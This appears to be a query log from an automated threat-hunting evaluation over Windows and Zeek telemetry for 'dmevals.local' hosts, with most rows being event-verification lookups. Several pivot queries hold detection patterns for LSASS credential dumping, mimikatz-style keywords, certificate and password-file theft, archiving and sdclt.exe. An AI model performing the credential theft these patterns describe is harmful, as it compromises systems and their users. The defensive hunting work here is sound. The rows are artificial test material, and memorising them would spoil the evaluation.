| q-1fe577eccd | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None |  |
| q-4ddf126648 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-fb1f0c6cfc | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjopf"} | None |  |
| q-57e91a3dd2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-e33eea3de9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw468x"} | None |  |
| q-7b65903968 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-ac116c01a3 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwDlSQT"} | None |  |
| q-c168378219 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCk1OJ"} | None |  |
| q-caed035304 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjE0ff"} | None |  |
| q-f3dca01f91 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjE0ff"} | None |  |
| q-8beab1909f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpLbBWk"} | None |  |
| q-e64702b97a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpLbBWk"} | None |  |
| q-f6ff0fe045 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpFTsz_"} | None |  |
| q-63f07b9b41 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpk1QgV"} | None |  |
| q-5c01f9857c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpk1QgV"} | None |  |
| q-41c7ffcdc3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-fd08f316bd | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2b9g"} | None |  |
| q-5481918b3e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItknvJ-S"} | None |  |
| q-b65cc12867 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItknvJ-S"} | None |  |
| q-b9856bbd7d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpHV4S3"} | None |  |
| q-cd4c42f4bc | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjFEcw"} | None |  |
| q-245ccc3b23 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsc9wOe"} | None |  |
| q-165798b740 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsQ2v-T"} | None |  |
| q-9c11d414de | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo5u"} | None |  |
| q-023c3c1f23 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo5u"} | None |  |
| q-f33e92fb63 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo5u"} | None |  |
| q-ff9b540d46 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo5W"} | None |  |
| q-666d0955ae | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-e122879323 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-bfd5e891e2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQb3a"} | None |  |
| q-ec93ed5c8d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCRb2e"} | None |  |
| q-56da72d6c0 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhDM5P"} | None |  |
| q-4555f6e577 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhDM5P"} | None |  |
| q-44630daff4 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhDM5P"} | None |  |
| q-122ac415a9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkmtAyJ"} | None |  |
| q-35e9e82706 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhDM45"} | None |  |
| q-e874f4a568 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjFEcb"} | None |  |
| q-a3ccc7dc9b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjFEcb"} | None |  |
| q-c92b3180e4 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItse-35u"} | None |  |
| q-263b06e58d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItse-35u"} | None |  |
| q-ccfb1f3ae8 | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:23.885000+00:00", "time_to": "2020-05-02T03:31:00.353000+00:00", "size": 100, "sub_field": "process.pare… | 61 |  |
| q-f60cf3e0df | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:23.885000+00:00", "time_to": "2020-05-02T03:31:00.353000+00:00", "size": 100, "sub_field": "process.executable"} | 249 |  |
| q-b5d5c95627 | pivot seed | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688 AND host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:23.885000+00:00", "time_to": "2020-05-02T03:31:00.353000+00:00", "size": 100, "sub_field": "process… | 63 |  |
| q-27e3d010f7 | pivot seed | aggregate | {"dataset": "windows.powershell", "field": "event.code", "query": "host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:23.885000+00:00", "time_to": "2020-05-02T03:31:00.353000+00:00", "size": 100, "sub_field": null} | 192 |  |
| q-48f0f083c3 | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56+00:00", "time_to": "2020-05-02T03:36:30.387000+00:00", "size": 100, "sub_field": "process.parent.ex… | 359 |  |
| q-e400356865 | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56+00:00", "time_to": "2020-05-02T03:36:30.387000+00:00", "size": 100, "sub_field": "process.executable"} | 1276 |  |
| q-ca2114ddf3 | pivot seed | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688 AND host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56+00:00", "time_to": "2020-05-02T03:36:30.387000+00:00", "size": 100, "sub_field": "process.pare… | 370 |  |
| q-9187c81f1c | pivot seed | aggregate | {"dataset": "windows.powershell", "field": "event.code", "query": "host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56+00:00", "time_to": "2020-05-02T03:36:30.387000+00:00", "size": 100, "sub_field": null} | 8602 |  |
| q-82d3cb50fe | pivot step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 1 AND host.name == \"scranton.dmevals.local\" AND (process.executable LIKE \"*csc.exe\" OR process.executable LIKE \"*hostui.exe\" OR process.executable LIKE \"*.scr\" OR p… | ERROR |  |
| q-4e33a1dde5 | pivot step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 11 AND host.name == \"scranton.dmevals.local\" AND (file.path LIKE \"*piklvia*\" OR file.path LIKE \"*qkbkqqbs*\" OR file.path LIKE \"*RES*.tmp\" OR file.path LIKE \"*victi… | ERROR |  |
| q-4c3c05b54c | pivot step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND host.name == \"scranton.dmevals.local\" AND (process.executable LIKE \"*csc.exe\" OR process.executable LIKE \"*hostui.exe\" OR process.executable LIKE \"*.scr\" … | ERROR |  |
| q-74ab938d1f | pivot step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND host.name == \"scranton.dmevals.local\" AND (file.path LIKE \"*piklvia*\" OR file.path LIKE \"*qkbkqqbs*\" OR file.path LIKE \"*RES*.tmp\" OR file.path LIKE \"*v… | 22 | F59 |
| q-c8a02c6c52 | pivot step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND host.name == \"scranton.dmevals.local\" AND (process.executable LIKE \"*csc.exe\" OR process.executable LIKE \"*hostui.exe\" OR process.executable LIKE \"*.scr\" … | 12 | F59, F62, F63, F65, F66 |
| q-ab1eda409c | pivot step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE host.name == \"scranton.dmevals.local\" AND event.code == \"4104\" AND (TO_LOWER(message) LIKE \"*lsass*\" OR TO_LOWER(message) LIKE \"*minidump*\" OR TO_LOWER(message) LIKE \"*sekur… | 10 | F60 |
| q-0d63ac5c98 | pivot step 4 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None | F61, F62 |
| q-1e78ca98c6 | pivot step 4 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwIqzeO"} | None |  |
| q-4d520db431 | pivot step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND host.name == \"scranton.dmevals.local\" AND TO_LOWER(process.executable) LIKE \"*hostui*\" \| KEEP @timestamp, _id, _index, process.executable, winlog.event_data… | ERROR |  |
| q-7de9975e0a | pivot step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND host.name == \"scranton.dmevals.local\" AND TO_LOWER(winlog.event_data.TargetImage) LIKE \"*lsass*\" \| KEEP @timestamp, _id, _index, process.executable, winlog.… | ERROR |  |
| q-dd4ccd7ab4 | pivot step 6 | get_fields | {"dataset": "windows.sysmon", "prefix": "win"} | None |  |
| q-65829f2382 | pivot step 7 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND host.name == \"scranton.dmevals.local\" AND TO_LOWER(win.TargetImage) LIKE \"*lsass*\" \| KEEP @timestamp, _id, _index, process.executable, win.SourceImage, win.… | 255 | F59, F64 |
| q-247b95f06f | pivot step 7 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND host.name == \"nashua.dmevals.local\" AND TO_LOWER(win.TargetImage) LIKE \"*lsass*\" \| KEEP @timestamp, _id, _index, process.executable, win.SourceImage, win.Ta… | 29 | F59, F64 |
| q-543510b239 | pivot step 8 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND host.name == \"scranton.dmevals.local\" AND TO_LOWER(win.SourceImage) LIKE \"*hostui*\" \| KEEP @timestamp, _id, _index, win.SourceImage, win.TargetImage, win.Gr… | 1 |  |
| q-73a45e2ba4 | pivot step 8 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND host.name == \"scranton.dmevals.local\" AND (TO_LOWER(file.path) LIKE \"*downloads*\" OR TO_LOWER(file.path) LIKE \"*.pfx\" OR TO_LOWER(file.path) LIKE \"*appdat… | 500 |  |
| q-face93ed7a | pivot step 9 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND host.name == \"scranton.dmevals.local\" AND (TO_LOWER(file.path) LIKE \"*.pfx\" OR TO_LOWER(file.path) LIKE \"*downloads*\" OR TO_LOWER(file.path) LIKE \"*passwo… | 319 | F66 |
| q-713c3696fc | pivot step 9 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND host.name == \"nashua.dmevals.local\" AND (TO_LOWER(file.path) LIKE \"*.pfx\" OR TO_LOWER(file.path) LIKE \"*downloads*\" OR TO_LOWER(file.path) LIKE \"*password… | 42 |  |
| q-3c10d0cd64 | pivot step 10 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND host.name == \"nashua.dmevals.local\" AND (process.executable LIKE \"*python.exe\" OR process.executable LIKE \"*Rar.exe\" OR process.executable LIKE \"*sdelete64… | 13 | F61, F63 |
| q-c9547c13c4 | pivot step 10 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND host.name == \"scranton.dmevals.local\" AND (TO_LOWER(file.path) LIKE \"*.pfx\" OR TO_LOWER(file.path) LIKE \"*passwords*\" OR TO_LOWER(file.path) LIKE \"*.7z\" … | 6 | F60, F61 |
| q-68a818f95e | pivot step 11 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND host.name == \"nashua.dmevals.local\" AND (TO_LOWER(file.path) LIKE \"*desktop*\" OR TO_LOWER(file.path) LIKE \"*roaming*\" OR TO_LOWER(file.path) LIKE \"*docume… | 3 | F61 |
| q-eb91099add | pivot step 11 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND host.name == \"scranton.dmevals.local\" AND TO_LOWER(file.path) LIKE \"*sysinternals*\" AND TO_LOWER(file.path) LIKE \"*.ps1\" \| KEEP @timestamp, _id, _index, f… | 0 |  |
| q-bc09c204de | pivot step 12 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND host.name == \"scranton.dmevals.local\" AND TO_LOWER(file.path) LIKE \"*sysinternals*\" \| KEEP @timestamp, _id, _index, file.path, process.executable \| SORT @t… | 311 | F63 |
| q-c246b346e5 | pivot step 12 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND host.name == \"nashua.dmevals.local\" AND TO_LOWER(file.path) LIKE \"*pbeesly*\" \| KEEP @timestamp, _id, _index, file.path, process.executable \| SORT @timestam… | 125 |  |
| q-6d44a32129 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpfwJ_Y"} | None |  |
| q-62d61f0f89 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpfwJ-Y"} | None |  |
| q-58669a62a9 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-c25905eaaa | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-e3fcb276d6 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-a528e3c349 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-3a59defeed | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-7619717ef5 | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkSzI"} | None |  |
| q-4cd817062f | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-e6a767578d | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQ71_"} | None |  |
| q-94a9a55129 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCRb2e"} | None |  |
| q-65be0fe31b | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCRb2e"} | None |  |
| q-6d23548934 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpjzkPd"} | None |  |
| q-32f419f6f9 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkx5Y3M"} | None |  |
| q-ee3bda7f11 | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-a0d638682e | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkmtdLv"} | None |  |
| q-8ab30c3636 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkmtdI9"} | None |  |
| q-32449c5ab8 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkmtAyz"} | None |  |
| q-85bbcf7a20 | pivot verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-0960b18294 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-da56d16881 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpVlTKv"} | None |  |
| q-ab2e311c99 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCRb2o"} | None |  |
| q-87e4e3fb26 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpHV4S3"} | None |  |
| q-68ecde3ab1 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2b9g"} | None |  |
| q-4b928669bd | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2b9g"} | None |  |
| q-4b7c892d4c | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkjomHY"} | None |  |
| q-736e0879b4 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-741e813a85 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-250a15a48a | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-4c85e57f81 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkILJ_D"} | None |  |
| q-79c4130879 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItn-AkDI"} | ERROR |  |
| q-a693c00937 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItn-AkDI"} | ERROR |  |
| q-211e479770 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpk1QgV"} | None |  |
| q-8dbc2881f3 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpizF2M"} | None |  |
| q-724b54dac7 | pivot step 14 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHoX1uOFchItn-AkDI"} | None | F65 |
| q-674dceb703 | pivot step 14 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND host.name == \"scranton.dmevals.local\" AND process.executable LIKE \"*sdclt.exe\" \| KEEP @timestamp, _id, _index, process.executable, process.command_line, proc… | 3 | F67 |
| q-ed4671e4f0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-2e7b4b6b4b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-f5eae73db6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-f14f2120b9 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo57"} | None |  |
| q-d60e17b7fa | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo57"} | None |  |
| q-c90c84453d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo54"} | None |  |
| q-498852da56 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-bc2046873c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpVlTKv"} | None |  |
| q-4455ccb901 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-28802565b1 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjYpu"} | None |  |
| q-9034b34da9 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwBj58r"} | None |  |
| q-44b78b27fa | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpMctHN"} | None |  |
| q-ebb742a123 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBM3"} | None |  |
| q-f628671060 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBM3"} | None |  |
| q-e531acdf84 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBMV"} | None |  |
| q-c61ecff373 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBM_"} | None |  |
| q-fb6785635b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwwWlFq"} | None |  |
| q-5cc3569b1c | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhC87m"} | None |  |
| q-592b0559ba | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhC87m"} | None |  |
| q-e0f8012e74 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhC87m"} | None |  |
| q-c49d86748d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBM3"} | None |  |
| q-1c6f917684 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhC87m"} | None |  |
| q-d255925130 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo54"} | None |  |
| q-9bcaf6986d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsU5KNV"} | None |  |
| q-5a668f0b85 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsU5KNV"} | None |  |
| q-d5d0411e10 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsS3MUJ"} | None |  |
| q-5ba46bdad8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkYcTxy"} | None |  |
| q-d16ab8b8e7 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpo7P8B"} | None |  |
| q-a3102111dc | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWXW"} | None |  |
| q-72c5a375f6 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWXW"} | None |  |
| q-305e3ca636 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpMcdEH"} | None |  |
| q-6f9f0094bb | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwHp5Zy"} | None |  |
| q-0136a69583 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchIttyFQcI"} | None |  |
| q-c47f4b8763 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrovu"} | None |  |
| q-6c15a7e8ff | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylr4ug"} | None |  |
| q-ffa778c7b0 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjYrA"} | None |  |
| q-06c0573545 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjYrA"} | None |  |
| q-0517088faf | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjoor"} | None |  |
| q-ac740c2f52 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjopc"} | None |  |
| q-8f0d696979 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz_h1K2"} | None |  |
| q-da91d70f96 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWX1"} | None |  |
| q-46d5b932c4 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWWO"} | None |  |
| q-1e085c21c7 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpLb9km"} | None |  |
| q-7b3f3e7f1b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpLb9km"} | None |  |
| q-b7558b0e00 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-d1adbdd4df | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-43f86ac162 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-fdbb6a3341 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-3874f8bbb0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpgwo_a"} | None |  |
| q-f4c737f63f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-6303992c0e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjFEcw"} | None |  |
| q-c6a8b7724c | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsO1YsM"} | None |  |
